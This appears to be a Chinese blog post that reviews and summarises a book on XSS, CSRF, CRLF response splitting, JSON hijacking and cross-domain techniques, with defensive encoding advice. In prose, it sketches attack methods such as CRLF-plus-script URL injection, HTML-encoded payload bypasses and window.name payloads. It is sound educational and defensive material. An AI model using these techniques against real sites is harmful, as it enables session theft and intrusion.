《XSS跨站脚本攻击剖析与防御》是一本专门剖析XSS安全的专业书，总共8章，主要包括的内容如下。

  • 第1章 XSS初探，主要阐述了XSS的基础知识，包括XSS的攻击原理和危害。
  • 第2章 XSS利用方式，就当前比较流行的XSS利用方式做了深入的剖析，这些攻击往往基于客户端，从挂马、窃取Cookies、会话劫持到钓鱼欺骗，各种攻击都不容忽视。
  • 第3章 XSS测试和利用工具，介绍了一些常见的XSS测试工具。
  • 第4章 发掘XSS漏洞，着重以黑盒和白盒的角度介绍如何发掘XSS漏洞，以便帮助读者树立安全意识。
  • 第5章 XSS Worm，讲解了Web 2.0的最大威胁——跨站脚本蠕虫，剖析了Web 2.0相关概念和其核心技术，这些知识对于理解和预防XSS Worm十分重要。
  • 第6章 Flash应用安全，就当前的Flash应用安全做出了深入阐述。
  • 第7章 深入XSS原理，讨论一些比较深入的XSS理论。第8章 防御XSS攻击，介绍了一些防范XSS攻击的方法，例如，运用XSS Filter进行输入过滤和输出编码，使用Firefox浏览器的Noscript插件抵御XSS攻击，使用HTTP-only的Cookies同样能起到保护敏感数据的作用。

《XSS跨站脚本攻击剖析与防御》适合网站管理人员、信息/网络安全或相关工作从业者、软件开发工程师，以及任何对Web安全技术感兴趣的读者。

此书讲的不深，但是够全面。此书最大的意义在于带你xss入门。市面上这是唯一一本专门讲xss的书，也是讲的最深最全的。如果你有js基础，看完书至少能保证会玩。

这本书适合前端与白帽子阅读。xss是最近几年比较热门的一个话题。国内并没有几本系统的介绍xss攻击的书籍。推荐。

深入XSS原理

深入浅出CSRF（跨站请求伪造）

盗用用户身份，发起恶意请求，形成原因即为采用了隐式身份验证（cookie）

防御：验证来源referer、使用验证码和加token等

Hacking JSON

JSON为JS子集，格式为名值对
JSON做对象的话用{}包裹键值对们，如果是做数组的话，用[]
JSON注入不甚了解，看书得出的结论为，JS在解析JSON时，如果JSON为恶意制作的，那么极有可能转化为javascript对象从而在浏览器中执行，对系统造成损害。
JSON Hijacking就是CSRF的另一种形式，书中也是这么讲。此即为通过恶意手段，获取用户访问正常页面时返回的JSON信息

HTTP Response Splitting

也称CRLF注射攻击，注射大致意味着， 在一个地方的输入框内，多输入代表其他部分信息的内容，同事不会被系统拦截或者拒绝，这就成功了。
CRLF == \r\n == 0x0D 0x0A == 13 10(ASCII码值) == 回车 换行 为http header中各项分隔的标志
利用的话 可以直接在url里加入%0D%0A%0D%0A后接js代码，这里的两个CRLF我猜想应该是分开http header 和body部分用的。

MHTML协议安全

MHTML是MIME HTML (Multipurpose Internet Mail Extension HTML，聚合超文本标记语言)的缩写，是由RFC 2557定义的把一个多媒体的页面所有内容都保存到同一个文档解决方案。这个方案是由微软提出从IE5.0开始支持，另外Opera9.0也开始支持，Safari可以把文件保存为.mht（MHTML文件的后缀）格式，但不支持显示它。

实际mhtml文件（.mht文件）内容

攻击手法的话，用CRLF可以直接在url里面操作相当于注入数据包吧，把mhtml格式的东西写进去，js恶意代码记得用自己规定的编码方式去编码
防御很简单：参数长度限制， 还有CRLF的字符过滤

防御DOM-Based XSS

一方面是避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务端使用动态页面来实现
另一方面就是强化客户端js代码

其他防御方式

  • Anti_XSS库
  • HttpOnly Cokkie

  • 上WAF

    防御CSRF攻击

  • 使用POST替代GET（只能增加利用难度或者是发现难度）
  • 检验HTTP Referer
  • 验证码
  • 使用Token，本书讨论了token放这放那的问题，最后总结一次性Token最有效。

    四两拨千斤：HttpOnly

    为cookie的某一项 或者几项 或者全部 设置HttpOnly使得js代码无法读取指定cookie值

输入输出时进行检查，编码输出

注意要在正确的地方使用正确的编码方式
如html encode，如果用户输入为html encode格式，在浏览器中html parser优先于js parser执行，因此先html解析再js代码执行，这个时候用户的输入在js运行前 已经被解析回js代码，所以一开始用户可以构造好parload再html编码之后进行攻击

正确防御XSS

要想要根治XSS，可以列出所有XSS可能发生的场景（用户输入出现的位置），再一一解决

  • 在HTML标签中输出

    攻击方式是构造&lt;script>标签或者任何能够产生脚本执行的方式
防御方法是对变量使用HtmlEncode

  • 在HTML属性中输出

    利用和防御方法同上

  • 在<script>标签中输出

    攻击者需要注意闭合单、双引号
防御使用JavascriptEncode

  • 在CSS中输出

    一般来说这样是禁止的，但是如果需要，推荐使用OWASP ESAPI中的encodeForCss（）函数
例：String safe=ESAPI.encoder().encoderForCSS(request.getParameter("input"));
其实现原理类似于ESAPI.encoder().encodeForJavaScript()函数，除了字母、数字外的所有字符都被编码成十六进制性时"\uHH"
【ESAPI (OWASP企业安全应用程序接口)是一个免费、开源的、网页应用程序安全控件库，它使程序员能够更容易写出更低风险的程序。ESAPI接口库被设计来使程序员能够更容易的在现有的程序中引入安全因素。ESAPI库也可以成为作为新程序开发的基础。】

  • 在地址中输出

    一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可
但urlencode不要用在Protocol（协议）和Host（域名或主机名）部分，会改变语义
攻击者就可以使用伪协议，如javascript、vbscript、dataURI等
防御即为检查uri开头是否为http，不是则进行urlencode
OWASP ESAPI中有encodeForURL（）函数，例：
String safe=ESAPI.encoder().encoderForURL(request.getParameter("input"));

  • DOM Based XSS的防御

    一般只会注意到在&lt;script>标签中输出必须过滤（编码）一次的情况，但是也要注意往往在使用document.write()等将内容输出到html页面的方法前，需要针对前几种情况做出对应的编码，防止在这一输出过程中输出XSS代码

五种客户端跨域方法：

JSONP(json with padding)

用callback参数传递数据，请求的相应页面也要有相关的响应数据

document.domain

其会显示当前域名，也可以人为设置，但只能设置成当前域名或者顶级域名。设置成相同域名即可进行原本不同域页面的操作了，也就是可以跨域读取之类了

window.name

无论页面内容怎么跳转，windows.name是不变的，所以用于在跨域时承载数据，一般用来缩短xss的payload。想要跨域访问元素可以直接改变相应元素的src属性使得看起来是一个域，然后运行window.name里面的payload

postMessage

是HTML5时代新出现的api，发送方通过postMessage方法传递自定义消息给指定接收的域；接收方通过事件监听可以获取传过来的消息

browser SOP bug

即各种浏览器解析sop(Same-Origin Policy)同源协议时出现的漏洞

三种服务器跨域方法

反代服务器

即将其他域名的资源映射到自己的域名之下，这样浏览器就认为他们是同源的

CORS（Cross-origin resource sharing）

跨域资源共享，发送端通过发送带有头信息Origin字段的请求来获取服务端资源，如果许可，返回带有Access-Control-Allow-Origin等字段的回应，不被许可则返回错误。和websocket很像（发送时都带有origin字段用于服务器判断是否可跨域，但具体发送的字段和获取到的字段有差），信安之路之前的文章里面 作者晚风说和jsonp很像，只是多了个类似白名单的东西在控制
